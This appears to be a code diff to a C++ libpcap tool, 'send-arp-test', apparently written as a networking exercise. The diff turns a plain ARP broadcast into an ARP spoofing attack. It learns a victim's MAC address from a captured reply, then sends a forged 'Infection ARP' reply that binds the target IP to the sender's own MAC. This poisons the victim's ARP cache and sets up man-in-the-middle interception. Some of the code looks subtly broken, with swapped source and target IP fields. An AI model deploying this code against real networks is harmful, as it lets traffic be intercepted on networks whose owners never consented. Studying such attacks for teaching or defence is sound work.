@@ -1,6 +1,4 @@
 #include "main.h"
-#include "ethhdr.h"
-#include "arphdr.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -10,8 +8,8 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+	printf("syntax: send-arp-test <interface> <sendIP> <targetIP> [<sender ip 2> <target ip 2> ...]\n");
+	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -19,51 +17,62 @@ int main(int argc, char* argv[]) {
 		usage();
 		return EXIT_FAILURE;
 	}
-
 	char* dev = argv[1];
-
-	//broad cast
-	pcap_t* BroadPcap = PcapOpen(dev, 0, 0, 0);
-	SendArpBroadcast(BroadPcap, dev, argv[2]);
-	pcap_close(BroadPcap);
-
-}
-
-pcap_t* PcapOpen(char* dev, int snaplen, int promisc, int to_ms) {
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* pcap = pcap_open_live(dev, snaplen, promisc, to_ms, errbuf);
 
-	return pcap;
-}
+	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	if (pcap == NULL) {
+		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
+		return -1;
+	}
 
-int SendArpBroadcast(pcap_t* pcap, char* dev, char* tip){
+	Mac smac = GetSourceMac(pcap);
+	unsigned char selfMac[6];
+	GetSelfMacFromInterface(dev, selfMac);
+
 	EthArpPacket packet;
 
-	unsigned char mac[6];
-	GetMacAddress(dev, mac);
-
-    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
-    packet.eth_.smac_ = Mac(mac);
 	packet.eth_.type_ = htons(EthHdr::Arp);
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
 
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = Mac(mac);
-    packet.arp_.sip_ = htonl(Ip("192.168.254.141"));
-    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arp_.tip_ = htonl(Ip(tip));
+	//Broadcast
+	SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), selfMac, ArpHdr::Request,argv[2], Mac("00:00:00:00:00:00"), argv[3]);
+	SendPacket(pcap, packet);
 
-	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-	}
+	//Infection ARP
+	SetPacket(packet, smac, selfMac, ArpHdr::Reply, argv[2], smac, argv[3]);
+	SendPacket(pcap, packet);
+
+	pcap_close(pcap);
+
 }
 
+void SetPacket(struct EthArpPacket &packet, Mac dmac, unsigned char smac[6], uint16_t op, char* sip, Mac tmac, char* tip){
+	packet.eth_.dmac_ = dmac;
+	packet.eth_.smac_ = smac;
+	packet.arp_.op_ = htons(op);
+	packet.arp_.smac_ = smac;
+    packet.arp_.sip_ = htonl(Ip(tip));
+    packet.arp_.tmac_ = tmac;
+    packet.arp_.tip_ = htonl(Ip(sip));
+}
 
-int GetMacAddress(const char *interface, unsigned char* mac_addr) {
+Mac GetSourceMac(pcap_t* pcap) {
+	struct pcap_pkthdr* header;
+	const u_char* packet;
+
+	int res = pcap_next_ex(pcap, &header, &packet);
+
+	struct EthArpPacket *etharp = (struct EthArpPacket *)packet;
+	Mac smac = etharp->arp_.smac();
+
+	return smac;
+}
+
+int GetSelfMacFromInterface(const char *interface, unsigned char* mac_addr) {
     struct ifreq ifr;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     
@@ -73,4 +82,12 @@ int GetMacAddress(const char *interface, unsigned char* mac_addr) {
     
     close(sock);
     return 0;
+}
+
+void SendPacket(pcap_t* pcap, struct EthArpPacket packet) {
+	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		exit(PCAP_ERROR);
+	}
 }
